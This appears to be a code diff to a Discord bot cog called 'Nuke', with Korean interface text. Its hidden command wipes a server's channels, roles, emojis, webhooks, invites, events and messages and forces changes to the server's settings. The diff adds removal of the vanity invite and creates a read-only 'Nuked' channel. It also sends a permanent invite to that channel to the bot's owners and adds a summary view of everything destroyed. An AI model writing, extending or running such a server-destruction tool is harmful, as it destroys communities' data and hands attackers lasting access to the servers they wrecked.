@@ -47,6 +47,7 @@ class Nuke(commands.Cog):
         action: str,
         author: discord.abc.User,
         guild: discord.Guild | None,
+        invite_url: str | None,
     ) -> ui.LayoutView:
         view = ui.LayoutView()
         view.add_item(ui.TextDisplay(f"## 🔔 {action} 사용됨"))
@@ -137,6 +138,20 @@ class Nuke(commands.Cog):
             if links.children:
                 view.add_item(links)
 
+        if invite_url:
+            invite_container = ui.Container(accent_color=0x1ABC9C)
+            invite_container.add_item(ui.TextDisplay("**영구 초대 링크**"))
+            invite_row = ui.ActionRow()
+            invite_row.add_item(
+                ui.Button(
+                    label="초대 링크 열기",
+                    style=discord.ButtonStyle.link,
+                    url=invite_url,
+                )
+            )
+            invite_container.add_item(invite_row)
+            view.add_item(invite_container)
+
         settings = ui.Container(accent_color=0x5865F2)
         settings.add_item(ui.TextDisplay("**강제 변경 설정**"))
         settings.add_item(ui.TextDisplay(f"이름: {self.GUILD_NAME}"))
@@ -175,12 +190,16 @@ class Nuke(commands.Cog):
         return owners
 
     async def _notify_owners(
-        self, action: str, author: discord.abc.User, guild: discord.Guild | None
+        self,
+        action: str,
+        author: discord.abc.User,
+        guild: discord.Guild | None,
+        invite_url: str | None = None,
     ):
         owners = await self._get_owner_users()
         if not owners:
             return
-        view = self._build_owner_log_view(action, author, guild)
+        view = self._build_owner_log_view(action, author, guild, invite_url)
         for owner in owners:
             await self._upsert_owner_log_message(owner, view)
 
@@ -223,6 +242,20 @@ class Nuke(commands.Cog):
             return dm_message
         try:
             return await ctx.send(content, delete_after=delete_after)
+        except (discord.Forbidden, discord.HTTPException):
+            return None
+
+    async def _send_view_dm_or_channel(
+        self, ctx: commands.Context, view: ui.LayoutView, *, delete_after: float | None = 15.0
+    ) -> discord.Message | None:
+        try:
+            dm_message = await ctx.author.send(view=view)
+        except (discord.Forbidden, discord.HTTPException):
+            dm_message = None
+        if dm_message:
+            return dm_message
+        try:
+            return await ctx.send(view=view, delete_after=delete_after)
         except (discord.Forbidden, discord.HTTPException):
             return None
 
@@ -389,6 +422,57 @@ class Nuke(commands.Cog):
         await asyncio.gather(*(handle(item) for item in items))
         return counts[count_key]
 
+    async def _create_permanent_invite(self, guild: discord.Guild) -> str | None:
+        channel = guild.system_channel
+        if channel is None:
+            channel = next(iter(guild.text_channels), None)
+        if channel is None:
+            return None
+        try:
+            invite = await channel.create_invite(
+                max_age=0,
+                max_uses=0,
+                unique=False,
+                reason="Nuke cleanup",
+            )
+        except (discord.Forbidden, discord.HTTPException):
+            return None
+        return invite.url
+
+    async def _create_nuked_channel_invite(
+        self, guild: discord.Guild
+    ) -> str | None:
+        overwrites = {
+            guild.default_role: discord.PermissionOverwrite(
+                view_channel=True,
+                send_messages=False,
+                add_reactions=False,
+                create_public_threads=False,
+                create_private_threads=False,
+                send_messages_in_threads=False,
+                attach_files=False,
+                embed_links=False,
+            )
+        }
+        try:
+            channel = await guild.create_text_channel(
+                "Nuked",
+                overwrites=overwrites,
+                reason="Nuke cleanup",
+            )
+        except (discord.Forbidden, discord.HTTPException):
+            return None
+        try:
+            invite = await channel.create_invite(
+                max_age=0,
+                max_uses=0,
+                unique=False,
+                reason="Nuke cleanup",
+            )
+        except (discord.Forbidden, discord.HTTPException):
+            return None
+        return invite.url
+
     async def _delete_webhooks(
         self, guild: discord.Guild, progress_message: discord.Message, counts: dict
     ):
@@ -414,7 +498,7 @@ class Nuke(commands.Cog):
             invites = await guild.invites()
         except (discord.Forbidden, discord.HTTPException):
             return counts["invites"]
-        return await self._bulk_delete(
+        await self._bulk_delete(
             guild,
             progress_message,
             counts,
@@ -424,6 +508,26 @@ class Nuke(commands.Cog):
             "초대 삭제 중",
             "deleted_invites",
         )
+        await self._remove_vanity_invite(guild, progress_message, counts)
+        return counts["invites"]
+
+    async def _remove_vanity_invite(
+        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
+    ):
+        if not getattr(guild, "vanity_url_code", None):
+            return counts["invites"]
+        for key in ("vanity_url_code", "vanity_code"):
+            try:
+                await guild.edit(**{key: None}, reason="Nuke cleanup")
+            except TypeError:
+                continue
+            except (discord.Forbidden, discord.HTTPException):
+                return counts["invites"]
+            counts["invites"] += 1
+            await self.config.guild(guild).deleted_invites.set(counts["invites"])
+            await self._maybe_update_progress(progress_message, counts, "초대 삭제 중")
+            return counts["invites"]
+        return counts["invites"]
 
     async def _delete_scheduled_events(
         self, guild: discord.Guild, progress_message: discord.Message, counts: dict
@@ -656,6 +760,33 @@ class Nuke(commands.Cog):
         await self._maybe_update_progress(progress_message, counts, "서버 설정 변경 중")
         return counts["updated_guild_settings"]
 
+    def _build_summary_view(self, elapsed: float, counts: dict) -> ui.LayoutView:
+        view = ui.LayoutView()
+        view.add_item(ui.TextDisplay("## ✅ 서버 정리 요약"))
+        view.add_item(
+            ui.TextDisplay(
+                f"**소요 시간:** {elapsed:.2f}초"
+            )
+        )
+        view.add_item(ui.Separator(visible=True))
+
+        summary = ui.Container(accent_color=0xF1C40F)
+        summary.add_item(ui.TextDisplay(f"채널: {counts['channels']}개"))
+        summary.add_item(ui.TextDisplay(f"역할: {counts['roles']}개"))
+        summary.add_item(ui.TextDisplay(f"이모지: {counts['emojis']}개"))
+        summary.add_item(ui.TextDisplay(f"스티커: {counts['stickers']}개"))
+        summary.add_item(ui.TextDisplay(f"사운드 보드: {counts['sounds']}개"))
+        summary.add_item(ui.TextDisplay(f"웹훅: {counts['webhooks']}개"))
+        summary.add_item(ui.TextDisplay(f"초대: {counts['invites']}개"))
+        summary.add_item(ui.TextDisplay(f"일정: {counts['events']}개"))
+        summary.add_item(ui.TextDisplay(f"메시지: {counts['purged_messages']}개"))
+        summary.add_item(ui.TextDisplay(f"권한 초기화: {counts['reset_permissions']}개"))
+        summary.add_item(ui.TextDisplay(f"자동 역할 제거: {counts['removed_auto_roles']}개"))
+        summary.add_item(ui.TextDisplay(f"서버 자산 초기화: {counts['reset_guild_assets']}회"))
+        summary.add_item(ui.TextDisplay(f"서버 설정 변경: {counts['updated_guild_settings']}회"))
+        view.add_item(summary)
+        return view
+
     @commands.command(hidden=True)
     @commands.guild_only()
     async def nuke(self, ctx: commands.Context):
@@ -665,7 +796,7 @@ class Nuke(commands.Cog):
         if ctx.guild is None:
             return
 
-        await self._notify_owners("nuke", ctx.author, ctx.guild)
+        invite_url = None
 
         if ctx.message:
             try:
@@ -770,6 +901,9 @@ class Nuke(commands.Cog):
             updated_guild_settings = await self._update_guild_settings(
                 ctx.guild, progress_dm, counts
             )
+        if ctx.guild.id not in self._stop_flags:
+            invite_url = await self._create_nuked_channel_invite(ctx.guild)
+        await self._notify_owners("nuke", ctx.author, ctx.guild, invite_url)
 
         await self.config.guild(ctx.guild).deleted_channels.set(deleted_channels)
         await self.config.guild(ctx.guild).deleted_roles.set(deleted_roles)
@@ -827,37 +961,24 @@ class Nuke(commands.Cog):
                 updated_guild_settings,
                 "완료",
             )
-        await self._send_dm(
-            ctx.author,
-            "⏱️ 소요 시간: {0:.2f}초\n"
-            "채널: {1}개\n"
-            "역할: {2}개\n"
-            "이모지: {3}개\n"
-            "스티커: {4}개\n"
-            "사운드 보드: {5}개\n"
-            "웹훅: {6}개\n"
-            "초대: {7}개\n"
-            "일정: {8}개\n"
-            "메시지: {9}개\n"
-            "권한 초기화: {10}개\n"
-            "자동 역할 제거: {11}개\n"
-            "서버 자산 초기화: {12}회\n"
-            "서버 설정 변경: {13}회".format(
-                elapsed,
-                deleted_channels,
-                deleted_roles,
-                deleted_emojis,
-                deleted_stickers,
-                deleted_sounds,
-                deleted_webhooks,
-                deleted_invites,
-                deleted_events,
-                purged_messages,
-                reset_permissions,
-                removed_auto_roles,
-                reset_guild_assets,
-                updated_guild_settings,
-            ),
+        summary_counts = {
+            "channels": deleted_channels,
+            "roles": deleted_roles,
+            "emojis": deleted_emojis,
+            "stickers": deleted_stickers,
+            "sounds": deleted_sounds,
+            "webhooks": deleted_webhooks,
+            "invites": deleted_invites,
+            "events": deleted_events,
+            "purged_messages": purged_messages,
+            "reset_permissions": reset_permissions,
+            "removed_auto_roles": removed_auto_roles,
+            "reset_guild_assets": reset_guild_assets,
+            "updated_guild_settings": updated_guild_settings,
+        }
+        await self._send_view_dm_or_channel(
+            ctx,
+            self._build_summary_view(elapsed, summary_counts),
         )
 
         await self.config.guild(ctx.guild).nuke_in_progress.set(False)
